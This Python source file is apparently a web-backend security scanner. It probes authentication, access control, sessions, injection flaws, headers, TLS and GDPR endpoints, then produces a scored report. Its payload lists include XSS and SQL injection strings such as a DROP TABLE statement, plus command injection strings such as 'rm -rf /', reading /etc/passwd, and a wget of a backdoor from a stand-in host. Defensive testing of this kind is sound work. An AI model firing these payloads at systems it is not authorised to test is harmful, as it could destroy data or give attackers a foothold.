#!/usr/bin/env python3
"""
Comprehensive Security Audit System for Backend
Performs vulnerability scanning, authentication testing, authorization checks, input validation, and security compliance
"""

import json
import time
import hashlib
import hmac
import base64
import jwt
import requests
import sqlite3
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import logging
import re
from urllib.parse import urljoin, urlparse
import ssl
import socket
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecurityLevel(Enum):
    """Security level enumeration"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class SecurityVulnerability:
    """Security vulnerability definition"""
    id: str
    title: str
    description: str
    level: SecurityLevel
    category: str
    cwe_id: Optional[str]
    cvss_score: Optional[float]
    affected_endpoint: Optional[str]
    recommendation: str
    timestamp: datetime
    status: str = "open"

@dataclass
class SecurityTest:
    """Security test result"""
    test_name: str
    category: str
    status: str  # 'passed', 'failed', 'warning'
    details: Dict[str, Any]
    timestamp: datetime
    duration: float

class SecurityAuditor:
    """Comprehensive security audit system"""
    
    def __init__(self, base_url: str, config: Dict[str, Any]):
        self.base_url = base_url.rstrip('/')
        self.config = config
        self.session = requests.Session()
        self.vulnerabilities = []
        self.test_results = []
        self.auth_tokens = {}
        
        # Security test patterns
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>'
        ]
        
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "1' OR '1' = '1' --"
        ]
        
        self.command_injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& whoami',
            '; rm -rf /',
            '| wget http://malicious.com/backdoor'
        ]
    
    def run_full_audit(self) -> Dict[str, Any]:
        """Run complete security audit"""
        logger.info("Starting comprehensive security audit...")
        
        start_time = time.time()
        
        # Authentication and Authorization Tests
        self._test_authentication()
        self._test_authorization()
        self._test_session_management()
        
        # Input Validation Tests
        self._test_sql_injection()
        self._test_xss_vulnerabilities()
        self._test_command_injection()
        self._test_input_validation()
        
        # API Security Tests
        self._test_api_security()
        self._test_rate_limiting()
        self._test_cors_policy()
        
        # Infrastructure Security Tests
        self._test_ssl_tls_configuration()
        self._test_headers_security()
        self._test_database_security()
        
        # Compliance Tests
        self._test_gdpr_compliance()
        self._test_owasp_top_10()
        
        audit_duration = time.time() - start_time
        
        return {
            'audit_timestamp': datetime.now().isoformat(),
            'duration_seconds': audit_duration,
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities_by_level': self._count_vulnerabilities_by_level(),
            'test_results': [asdict(result) for result in self.test_results],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities],
            'security_score': self._calculate_security_score(),
            'recommendations': self._generate_recommendations()
        }
    
    def _test_authentication(self):
        """Test authentication mechanisms"""
        logger.info("Testing authentication...")
        
        # Test password strength
        self._test_password_policy()
        
        # Test brute force protection
        self._test_brute_force_protection()
        
        # Test account lockout
        self._test_account_lockout()
        
        # Test password reset
        self._test_password_reset()
        
        # Test multi-factor authentication
        self._test_mfa_implementation()
    
    def _test_password_policy(self):
        """Test password policy enforcement"""
        weak_passwords = [
            'password',
            '123456',
            'qwerty',
            'admin',
            'test123'
        ]
        
        for password in weak_passwords:
            try:
                response = self.session.post(
                    f"{self.base_url}/auth/register",
                    json={
                        'email': 'test@example.com',
                        'password': password,
                        'name': 'Test User'
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    self._add_vulnerability(
                        'weak_password_policy',
                        'Weak Password Policy',
                        f'Weak password "{password}" was accepted',
                        SecurityLevel.MEDIUM,
                        'authentication',
                        'CWE-521',
                        5.0,
                        '/auth/register',
                        'Implement strong password policy with minimum length, complexity requirements'
                    )
                    break
                    
            except Exception as e:
                logger.warning(f"Password policy test failed: {e}")
    
    def _test_brute_force_protection(self):
        """Test brute force protection"""
        logger.info("Testing brute force protection...")
        
        failed_attempts = 0
        max_attempts = 20
        
        for i in range(max_attempts):
            try:
                response = self.session.post(
                    f"{self.base_url}/auth/login",
                    json={
                        'email': 'nonexistent@example.com',
                        'password': f'wrong_password_{i}'
                    },
                    timeout=10
                )
                
                if response.status_code == 401:
                    failed_attempts += 1
                else:
                    break
                    
            except Exception as e:
                logger.warning(f"Brute force test failed: {e}")
                break
        
        if failed_attempts >= max_attempts:
            self._add_vulnerability(
                'no_brute_force_protection',
                'No Brute Force Protection',
                f'Account was not locked after {failed_attempts} failed attempts',
                SecurityLevel.HIGH,
                'authentication',
                'CWE-307',
                7.5,
                '/auth/login',
                'Implement account lockout after multiple failed login attempts'
            )
    
    def _test_account_lockout(self):
        """Test account lockout mechanism"""
        # This would require a test account to be locked
        # For now, we'll check if lockout endpoints exist
        try:
            response = self.session.get(f"{self.base_url}/auth/account-status")
            if response.status_code == 404:
                self._add_vulnerability(
                    'no_account_lockout',
                    'No Account Lockout Mechanism',
                    'No account lockout mechanism detected',
                    SecurityLevel.MEDIUM,
                    'authentication',
                    'CWE-307',
                    5.0,
                    '/auth/login',
                    'Implement account lockout mechanism with temporary suspension'
                )
        except Exception:
            pass
    
    def _test_password_reset(self):
        """Test password reset functionality"""
        try:
            response = self.session.post(
                f"{self.base_url}/auth/forgot-password",
                json={'email': 'test@example.com'},
                timeout=10
            )
            
            # Check if reset token is properly secured
            if response.status_code == 200:
                # Check if response contains sensitive information
                response_data = response.json()
                if 'token' in str(response_data) or 'password' in str(response_data):
                    self._add_vulnerability(
                        'insecure_password_reset',
                        'Insecure Password Reset',
                        'Password reset response may contain sensitive information',
                        SecurityLevel.MEDIUM,
                        'authentication',
                        'CWE-640',
                        5.0,
                        '/auth/forgot-password',
                        'Ensure password reset tokens are not exposed in responses'
                    )
                    
        except Exception as e:
            logger.warning(f"Password reset test failed: {e}")
    
    def _test_mfa_implementation(self):
        """Test multi-factor authentication"""
        try:
            response = self.session.get(f"{self.base_url}/auth/mfa-status")
            if response.status_code == 404:
                self._add_vulnerability(
                    'no_mfa',
                    'No Multi-Factor Authentication',
                    'Multi-factor authentication is not implemented',
                    SecurityLevel.MEDIUM,
                    'authentication',
                    'CWE-308',
                    5.0,
                    '/auth/login',
                    'Implement multi-factor authentication for sensitive operations'
                )
        except Exception:
            pass
    
    def _test_authorization(self):
        """Test authorization mechanisms"""
        logger.info("Testing authorization...")
        
        # Test role-based access control
        self._test_rbac_implementation()
        
        # Test privilege escalation
        self._test_privilege_escalation()
        
        # Test resource access control
        self._test_resource_access()
    
    def _test_rbac_implementation(self):
        """Test role-based access control"""
        # Test if different roles have appropriate access
        test_endpoints = [
            '/admin/users',
            '/admin/jobs',
            '/admin/companies',
            '/user/profile',
            '/jobs/create'
        ]
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                if response.status_code == 200 and 'admin' in endpoint:
                    self._add_vulnerability(
                        'weak_rbac',
                        'Weak Role-Based Access Control',
                        f'Admin endpoint {endpoint} accessible without proper authorization',
                        SecurityLevel.HIGH,
                        'authorization',
                        'CWE-285',
                        8.0,
                        endpoint,
                        'Implement proper role-based access control for admin endpoints'
                    )
                    
            except Exception as e:
                logger.warning(f"RBAC test failed for {endpoint}: {e}")
    
    def _test_privilege_escalation(self):
        """Test privilege escalation vulnerabilities"""
        # Test if regular users can access admin functions
        try:
            # Try to access admin endpoint with regular user token
            if 'user_token' in self.auth_tokens:
                headers = {'Authorization': f'Bearer {self.auth_tokens["user_token"]}'}
                response = self.session.get(
                    f"{self.base_url}/admin/users",
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    self._add_vulnerability(
                        'privilege_escalation',
                        'Privilege Escalation Vulnerability',
                        'Regular user can access admin functions',
                        SecurityLevel.CRITICAL,
                        'authorization',
                        'CWE-269',
                        9.0,
                        '/admin/users',
                        'Implement proper authorization checks for all admin endpoints'
                    )
                    
        except Exception as e:
            logger.warning(f"Privilege escalation test failed: {e}")
    
    def _test_resource_access(self):
        """Test resource access control"""
        # Test if users can access other users' resources
        try:
            response = self.session.get(f"{self.base_url}/users/999999/profile")
            
            if response.status_code == 200:
                self._add_vulnerability(
                    'insecure_direct_object_reference',
                    'Insecure Direct Object Reference',
                    'Users can access other users\' profiles without authorization',
                    SecurityLevel.HIGH,
                    'authorization',
                    'CWE-639',
                    7.5,
                    '/users/{id}/profile',
                    'Implement proper authorization checks for resource access'
                )
                
        except Exception as e:
            logger.warning(f"Resource access test failed: {e}")
    
    def _test_session_management(self):
        """Test session management"""
        logger.info("Testing session management...")
        
        # Test session timeout
        self._test_session_timeout()
        
        # Test session fixation
        self._test_session_fixation()
        
        # Test session invalidation
        self._test_session_invalidation()
    
    def _test_session_timeout(self):
        """Test session timeout mechanism"""
        # This would require waiting for session timeout
        # For now, we'll check if session timeout is configured
        try:
            response = self.session.get(f"{self.base_url}/auth/session-info")
            if response.status_code == 200:
                session_info = response.json()
                if 'expires_in' not in session_info or session_info['expires_in'] > 3600:
                    self._add_vulnerability(
                        'long_session_timeout',
                        'Long Session Timeout',
                        'Session timeout is too long or not configured',
                        SecurityLevel.MEDIUM,
                        'session_management',
                        'CWE-613',
                        4.0,
                        '/auth/login',
                        'Implement reasonable session timeout (e.g., 30 minutes)'
                    )
        except Exception:
            pass
    
    def _test_session_fixation(self):
        """Test session fixation vulnerability"""
        # Test if session ID changes after login
        try:
            # Get session before login
            pre_login_response = self.session.get(f"{self.base_url}/auth/session")
            pre_session_id = pre_login_response.cookies.get('session_id')
            
            # Login
            login_response = self.session.post(
                f"{self.base_url}/auth/login",
                json={'email': 'test@example.com', 'password': 'password123'}
            )
            
            # Get session after login
            post_session_id = self.session.cookies.get('session_id')
            
            if pre_session_id and post_session_id and pre_session_id == post_session_id:
                self._add_vulnerability(
                    'session_fixation',
                    'Session Fixation Vulnerability',
                    'Session ID does not change after login',
                    SecurityLevel.HIGH,
                    'session_management',
                    'CWE-384',
                    7.0,
                    '/auth/login',
                    'Regenerate session ID after successful authentication'
                )
                
        except Exception as e:
            logger.warning(f"Session fixation test failed: {e}")
    
    def _test_session_invalidation(self):
        """Test session invalidation on logout"""
        try:
            # Login first
            login_response = self.session.post(
                f"{self.base_url}/auth/login",
                json={'email': 'test@example.com', 'password': 'password123'}
            )
            
            if login_response.status_code == 200:
                # Logout
                logout_response = self.session.post(f"{self.base_url}/auth/logout")
                
                # Try to access protected resource
                protected_response = self.session.get(f"{self.base_url}/user/profile")
                
                if protected_response.status_code == 200:
                    self._add_vulnerability(
                        'weak_session_invalidation',
                        'Weak Session Invalidation',
                        'Session not properly invalidated after logout',
                        SecurityLevel.MEDIUM,
                        'session_management',
                        'CWE-613',
                        5.0,
                        '/auth/logout',
                        'Properly invalidate session tokens on logout'
                    )
                    
        except Exception as e:
            logger.warning(f"Session invalidation test failed: {e}")
    
    def _test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        logger.info("Testing SQL injection vulnerabilities...")
        
        test_endpoints = [
            '/jobs/search?q={payload}',
            '/users/search?name={payload}',
            '/companies/search?name={payload}'
        ]
        
        for endpoint_template in test_endpoints:
            for payload in self.sql_injection_payloads:
                try:
                    endpoint = endpoint_template.format(payload=payload)
                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'sql syntax',
                        'mysql error',
                        'postgresql error',
                        'sqlite error',
                        'oracle error',
                        'microsoft ole db provider'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in response_text:
                            self._add_vulnerability(
                                'sql_injection',
                                'SQL Injection Vulnerability',
                                f'SQL injection detected with payload: {payload}',
                                SecurityLevel.CRITICAL,
                                'input_validation',
                                'CWE-89',
                                9.0,
                                endpoint,
                                'Use parameterized queries and input validation'
                            )
                            break
                            
                except Exception as e:
                    logger.warning(f"SQL injection test failed: {e}")
    
    def _test_xss_vulnerabilities(self):
        """Test XSS vulnerabilities"""
        logger.info("Testing XSS vulnerabilities...")
        
        test_endpoints = [
            '/jobs/create',
            '/user/profile',
            '/companies/create'
        ]
        
        for endpoint in test_endpoints:
            for payload in self.xss_payloads:
                try:
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json={'description': payload, 'title': 'Test Job'},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        # Check if payload is reflected in response
                        response_text = response.text
                        if payload in response_text:
                            self._add_vulnerability(
                                'xss_vulnerability',
                                'Cross-Site Scripting (XSS)',
                                f'XSS vulnerability detected with payload: {payload}',
                                SecurityLevel.HIGH,
                                'input_validation',
                                'CWE-79',
                                8.0,
                                endpoint,
                                'Implement proper input sanitization and output encoding'
                            )
                            
                except Exception as e:
                    logger.warning(f"XSS test failed: {e}")
    
    def _test_command_injection(self):
        """Test command injection vulnerabilities"""
        logger.info("Testing command injection vulnerabilities...")
        
        test_endpoints = [
            '/admin/system/command',
            '/jobs/import',
            '/users/import'
        ]
        
        for endpoint in test_endpoints:
            for payload in self.command_injection_payloads:
                try:
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json={'command': payload},
                        timeout=10
                    )
                    
                    # Check for command execution indicators
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        if any(indicator in response_text for indicator in ['root:', 'bin/', 'etc/', 'usr/']):
                            self._add_vulnerability(
                                'command_injection',
                                'Command Injection Vulnerability',
                                f'Command injection detected with payload: {payload}',
                                SecurityLevel.CRITICAL,
                                'input_validation',
                                'CWE-78',
                                9.0,
                                endpoint,
                                'Avoid command execution and use safe alternatives'
                            )
                            
                except Exception as e:
                    logger.warning(f"Command injection test failed: {e}")
    
    def _test_input_validation(self):
        """Test general input validation"""
        logger.info("Testing input validation...")
        
        # Test email validation
        invalid_emails = [
            'invalid-email',
            'test@',
            '@example.com',
            'test..test@example.com',
            'test@example..com'
        ]
        
        for email in invalid_emails:
            try:
                response = self.session.post(
                    f"{self.base_url}/auth/register",
                    json={
                        'email': email,
                        'password': 'password123',
                        'name': 'Test User'
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    self._add_vulnerability(
                        'weak_email_validation',
                        'Weak Email Validation',
                        f'Invalid email "{email}" was accepted',
                        SecurityLevel.MEDIUM,
                        'input_validation',
                        'CWE-20',
                        4.0,
                        '/auth/register',
                        'Implement proper email validation'
                    )
                    break
                    
            except Exception as e:
                logger.warning(f"Email validation test failed: {e}")
    
    def _test_api_security(self):
        """Test API security measures"""
        logger.info("Testing API security...")
        
        # Test API versioning
        self._test_api_versioning()
        
        # Test API documentation security
        self._test_api_documentation()
        
        # Test API rate limiting
        self._test_rate_limiting()
    
    def _test_api_versioning(self):
        """Test API versioning implementation"""
        try:
            response = self.session.get(f"{self.base_url}/api/v1/health")
            if response.status_code == 404:
                self._add_vulnerability(
                    'no_api_versioning',
                    'No API Versioning',
                    'API versioning is not implemented',
                    SecurityLevel.LOW,
                    'api_security',
                    'CWE-754',
                        3.0,
                        '/api/',
                        'Implement API versioning for better security and compatibility'
                    )
        except Exception:
            pass
    
    def _test_api_documentation(self):
        """Test API documentation security"""
        sensitive_endpoints = [
            '/swagger',
            '/api-docs',
            '/docs',
            '/redoc'
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    self._add_vulnerability(
                        'exposed_api_docs',
                        'Exposed API Documentation',
                        f'API documentation exposed at {endpoint}',
                        SecurityLevel.MEDIUM,
                        'api_security',
                        'CWE-200',
                        5.0,
                        endpoint,
                        'Restrict access to API documentation in production'
                    )
            except Exception:
                pass
    
    def _test_rate_limiting(self):
        """Test rate limiting implementation"""
        logger.info("Testing rate limiting...")
        
        # Test if rate limiting is implemented
        for i in range(100):
            try:
                response = self.session.get(f"{self.base_url}/jobs")
                if response.status_code == 429:  # Too Many Requests
                    break
            except Exception:
                break
        else:
            self._add_vulnerability(
                'no_rate_limiting',
                'No Rate Limiting',
                'Rate limiting is not implemented',
                SecurityLevel.MEDIUM,
                'api_security',
                'CWE-770',
                5.0,
                '/jobs',
                'Implement rate limiting to prevent abuse'
            )
    
    def _test_cors_policy(self):
        """Test CORS policy configuration"""
        logger.info("Testing CORS policy...")
        
        try:
            response = self.session.options(f"{self.base_url}/jobs")
            cors_headers = response.headers.get('Access-Control-Allow-Origin')
            
            if cors_headers == '*' or not cors_headers:
                self._add_vulnerability(
                    'weak_cors_policy',
                    'Weak CORS Policy',
                    'CORS policy allows all origins or is not configured',
                    SecurityLevel.MEDIUM,
                    'api_security',
                    'CWE-942',
                        5.0,
                        '/jobs',
                        'Configure restrictive CORS policy'
                    )
        except Exception as e:
            logger.warning(f"CORS test failed: {e}")
    
    def _test_ssl_tls_configuration(self):
        """Test SSL/TLS configuration"""
        logger.info("Testing SSL/TLS configuration...")
        
        try:
            parsed_url = urlparse(self.base_url)
            if parsed_url.scheme == 'https':
                hostname = parsed_url.hostname
                port = parsed_url.port or 443
                
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        
                        # Check certificate expiration
                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if not_after < datetime.now() + timedelta(days=30):
                            self._add_vulnerability(
                                'expiring_ssl_cert',
                                'Expiring SSL Certificate',
                                f'SSL certificate expires on {not_after}',
                                SecurityLevel.MEDIUM,
                                'infrastructure',
                                'CWE-295',
                                4.0,
                                self.base_url,
                                'Renew SSL certificate before expiration'
                            )
                        
                        # Check SSL version
                        if ssock.version() in ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1']:
                            self._add_vulnerability(
                                'weak_ssl_version',
                                'Weak SSL/TLS Version',
                                f'Using weak SSL/TLS version: {ssock.version()}',
                                SecurityLevel.HIGH,
                                'infrastructure',
                                'CWE-326',
                                7.0,
                                self.base_url,
                                'Disable weak SSL/TLS versions'
                            )
                            
        except Exception as e:
            logger.warning(f"SSL/TLS test failed: {e}")
    
    def _test_headers_security(self):
        """Test security headers"""
        logger.info("Testing security headers...")
        
        try:
            response = self.session.get(f"{self.base_url}/")
            
            # Check for security headers
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'X-XSS-Protection': 'Missing X-XSS-Protection header',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing CSP header'
            }
            
            for header, message in security_headers.items():
                if header not in response.headers:
                    self._add_vulnerability(
                        f'missing_{header.lower().replace("-", "_")}',
                        f'Missing {header}',
                        message,
                        SecurityLevel.MEDIUM,
                        'infrastructure',
                        'CWE-693',
                        4.0,
                        '/',
                        f'Add {header} security header'
                    )
                    
        except Exception as e:
            logger.warning(f"Security headers test failed: {e}")
    
    def _test_database_security(self):
        """Test database security configuration"""
        logger.info("Testing database security...")
        
        # This would require database access
        # For now, we'll check for common database security issues
        try:
            # Check if database connection info is exposed
            response = self.session.get(f"{self.base_url}/health")
            if response.status_code == 200:
                health_data = response.json()
                if 'database' in health_data:
                    db_info = health_data['database']
                    if 'connection_string' in str(db_info) or 'password' in str(db_info):
                        self._add_vulnerability(
                            'exposed_db_info',
                            'Exposed Database Information',
                            'Database connection information is exposed',
                            SecurityLevel.HIGH,
                            'database_security',
                            'CWE-200',
                            7.0,
                            '/health',
                            'Remove sensitive database information from health checks'
                        )
        except Exception as e:
            logger.warning(f"Database security test failed: {e}")
    
    def _test_gdpr_compliance(self):
        """Test GDPR compliance"""
        logger.info("Testing GDPR compliance...")
        
        # Test data retention
        self._test_data_retention()
        
        # Test data portability
        self._test_data_portability()
        
        # Test right to be forgotten
        self._test_right_to_be_forgotten()
    
    def _test_data_retention(self):
        """Test data retention policies"""
        try:
            response = self.session.get(f"{self.base_url}/privacy/retention-policy")
            if response.status_code == 404:
                self._add_vulnerability(
                    'no_data_retention_policy',
                    'No Data Retention Policy',
                    'Data retention policy is not documented',
                    SecurityLevel.MEDIUM,
                    'gdpr_compliance',
                    'CWE-200',
                    4.0,
                    '/privacy/',
                    'Implement and document data retention policies'
                )
        except Exception:
            pass
    
    def _test_data_portability(self):
        """Test data portability (GDPR Article 20)"""
        try:
            response = self.session.get(f"{self.base_url}/user/data-export")
            if response.status_code == 404:
                self._add_vulnerability(
                    'no_data_portability',
                    'No Data Portability',
                    'Data export functionality not implemented (GDPR Article 20)',
                    SecurityLevel.MEDIUM,
                    'gdpr_compliance',
                    'CWE-200',
                    4.0,
                    '/user/',
                    'Implement data export functionality for GDPR compliance'
                )
        except Exception:
            pass
    
    def _test_right_to_be_forgotten(self):
        """Test right to be forgotten (GDPR Article 17)"""
        try:
            response = self.session.delete(f"{self.base_url}/user/account")
            if response.status_code == 404:
                self._add_vulnerability(
                    'no_right_to_be_forgotten',
                    'No Right to be Forgotten',
                    'Account deletion not implemented (GDPR Article 17)',
                    SecurityLevel.MEDIUM,
                    'gdpr_compliance',
                    'CWE-200',
                    4.0,
                    '/user/',
                    'Implement account deletion for GDPR compliance'
                )
        except Exception:
            pass
    
    def _test_owasp_top_10(self):
        """Test OWASP Top 10 vulnerabilities"""
        logger.info("Testing OWASP Top 10...")
        
        # A01:2021 - Broken Access Control
        self._test_broken_access_control()
        
        # A02:2021 - Cryptographic Failures
        self._test_cryptographic_failures()
        
        # A03:2021 - Injection
        # Already tested in _test_sql_injection and _test_xss_vulnerabilities
        
        # A04:2021 - Insecure Design
        self._test_insecure_design()
        
        # A05:2021 - Security Misconfiguration
        self._test_security_misconfiguration()
    
    def _test_broken_access_control(self):
        """Test broken access control (A01:2021)"""
        # Test if users can access admin functions
        try:
            response = self.session.get(f"{self.base_url}/admin/dashboard")
            if response.status_code == 200:
                self._add_vulnerability(
                    'broken_access_control',
                    'Broken Access Control (A01:2021)',
                    'Admin dashboard accessible without proper authorization',
                    SecurityLevel.CRITICAL,
                    'owasp_top_10',
                    'CWE-285',
                    9.0,
                    '/admin/dashboard',
                    'Implement proper access control for all sensitive endpoints'
                )
        except Exception as e:
            logger.warning(f"Broken access control test failed: {e}")
    
    def _test_cryptographic_failures(self):
        """Test cryptographic failures (A02:2021)"""
        # Check if sensitive data is properly encrypted
        try:
            response = self.session.get(f"{self.base_url}/user/profile")
            if response.status_code == 200:
                profile_data = response.json()
                # Check for sensitive data in plain text
                sensitive_fields = ['password', 'ssn', 'credit_card', 'api_key']
                for field in sensitive_fields:
                    if field in str(profile_data):
                        self._add_vulnerability(
                            'cryptographic_failure',
                            'Cryptographic Failures (A02:2021)',
                            f'Sensitive data {field} not properly encrypted',
                            SecurityLevel.CRITICAL,
                            'owasp_top_10',
                            'CWE-311',
                            9.0,
                            '/user/profile',
                            'Encrypt sensitive data at rest and in transit'
                        )
                        break
        except Exception as e:
            logger.warning(f"Cryptographic failures test failed: {e}")
    
    def _test_insecure_design(self):
        """Test insecure design (A04:2021)"""
        # Check for design flaws
        try:
            # Test if password reset tokens are predictable
            response1 = self.session.post(f"{self.base_url}/auth/forgot-password", 
                                         json={'email': 'user1@example.com'})
            response2 = self.session.post(f"{self.base_url}/auth/forgot-password", 
                                         json={'email': 'user2@example.com'})
            
            if response1.status_code == 200 and response2.status_code == 200:
                # Check if tokens are similar (indicating weak design)
                token1 = response1.json().get('token', '')
                token2 = response2.json().get('token', '')
                
                if token1 and token2 and len(set(token1) & set(token2)) > len(token1) * 0.8:
                    self._add_vulnerability(
                        'insecure_design',
                        'Insecure Design (A04:2021)',
                        'Password reset tokens are predictable',
                        SecurityLevel.HIGH,
                        'owasp_top_10',
                        'CWE-754',
                        8.0,
                        '/auth/forgot-password',
                        'Use cryptographically secure random tokens'
                    )
        except Exception as e:
            logger.warning(f"Insecure design test failed: {e}")
    
    def _test_security_misconfiguration(self):
        """Test security misconfiguration (A05:2021)"""
        # Check for default configurations
        try:
            response = self.session.get(f"{self.base_url}/")
            
            # Check for default server headers
            server_header = response.headers.get('Server', '')
            if 'default' in server_header.lower() or 'test' in server_header.lower():
                self._add_vulnerability(
                    'security_misconfiguration',
                    'Security Misconfiguration (A05:2021)',
                    'Default server configuration detected',
                    SecurityLevel.MEDIUM,
                    'owasp_top_10',
                    'CWE-16',
                    5.0,
                    '/',
                    'Remove default configurations and harden server settings'
                )
        except Exception as e:
            logger.warning(f"Security misconfiguration test failed: {e}")
    
    def _add_vulnerability(self, vuln_id: str, title: str, description: str, 
                          level: SecurityLevel, category: str, cwe_id: Optional[str],
                          cvss_score: Optional[float], affected_endpoint: Optional[str],
                          recommendation: str):
        """Add a vulnerability to the list"""
        vulnerability = SecurityVulnerability(
            id=vuln_id,
            title=title,
            description=description,
            level=level,
            category=category,
            cwe_id=cwe_id,
            cvss_score=cvss_score,
            affected_endpoint=affected_endpoint,
            recommendation=recommendation,
            timestamp=datetime.now()
        )
        self.vulnerabilities.append(vulnerability)
        logger.warning(f"Vulnerability found: {title} ({level.value})")
    
    def _count_vulnerabilities_by_level(self) -> Dict[str, int]:
        """Count vulnerabilities by security level"""
        counts = {'low': 0, 'medium': 0, 'high': 0, 'critical': 0}
        for vuln in self.vulnerabilities:
            counts[vuln.level.value] += 1
        return counts
    
    def _calculate_security_score(self) -> float:
        """Calculate overall security score (0-100)"""
        if not self.vulnerabilities:
            return 100.0
        
        # Weight vulnerabilities by severity
        weights = {
            SecurityLevel.LOW: 1,
            SecurityLevel.MEDIUM: 3,
            SecurityLevel.HIGH: 7,
            SecurityLevel.CRITICAL: 10
        }
        
        total_weight = sum(weights[vuln.level] for vuln in self.vulnerabilities)
        max_possible_weight = 100  # Arbitrary maximum
        
        score = max(0, 100 - (total_weight / max_possible_weight) * 100)
        return round(score, 2)
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Group vulnerabilities by category
        by_category = {}
        for vuln in self.vulnerabilities:
            if vuln.category not in by_category:
                by_category[vuln.category] = []
            by_category[vuln.category].append(vuln)
        
        # Generate recommendations for each category
        for category, vulns in by_category.items():
            critical_vulns = [v for v in vulns if v.level in [SecurityLevel.HIGH, SecurityLevel.CRITICAL]]
            if critical_vulns:
                recommendations.append(f"Priority: Fix {len(critical_vulns)} critical/high vulnerabilities in {category}")
            
            # Add specific recommendations
            for vuln in vulns[:3]:  # Limit to top 3 per category
                recommendations.append(f"- {vuln.recommendation}")
        
        return recommendations
    
    def generate_report(self) -> str:
        """Generate a human-readable security report"""
        report = f"""
=== SECURITY AUDIT REPORT ===
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target: {self.base_url}

OVERALL SECURITY SCORE: {self._calculate_security_score()}/100

VULNERABILITIES SUMMARY:
"""
        
        counts = self._count_vulnerabilities_by_level()
        for level, count in counts.items():
            report += f"  {level.upper()}: {count}\n"
        
        report += f"\nTOTAL VULNERABILITIES: {len(self.vulnerabilities)}\n"
        
        if self.vulnerabilities:
            report += "\nDETAILED VULNERABILITIES:\n"
            for vuln in sorted(self.vulnerabilities, key=lambda x: x.level.value, reverse=True):
                report += f"""
[{vuln.level.value.upper()}] {vuln.title}
  Description: {vuln.description}
  Category: {vuln.category}
  CWE: {vuln.cwe_id or 'N/A'}
  CVSS: {vuln.cvss_score or 'N/A'}
  Endpoint: {vuln.affected_endpoint or 'N/A'}
  Recommendation: {vuln.recommendation}
"""
        
        recommendations = self._generate_recommendations()
        if recommendations:
            report += "\nRECOMMENDATIONS:\n"
            for rec in recommendations:
                report += f"  {rec}\n"
        
        report += "\n=== END REPORT ===\n"
        return report

def main():
    """Main function for testing the security auditor"""
    config = {
        'test_credentials': {
            'admin': {'email': 'admin@example.com', 'password': 'admin123'},
            'user': {'email': 'user@example.com', 'password': 'user123'}
        },
        'test_endpoints': [
            '/auth/login',
            '/auth/register',
            '/jobs',
            '/users',
            '/admin'
        ]
    }
    
    base_url = "http://localhost:8000"  # Change to your backend URL
    
    auditor = SecurityAuditor(base_url, config)
    
    print("Starting security audit...")
    audit_results = auditor.run_full_audit()
    
    # Save results to file
    with open('security_audit_results.json', 'w') as f:
        json.dump(audit_results, f, indent=2, default=str)
    
    # Generate and print report
    report = auditor.generate_report()
    print(report)
    
    print(f"Security audit completed. Results saved to security_audit_results.json")

if __name__ == "__main__":
    main()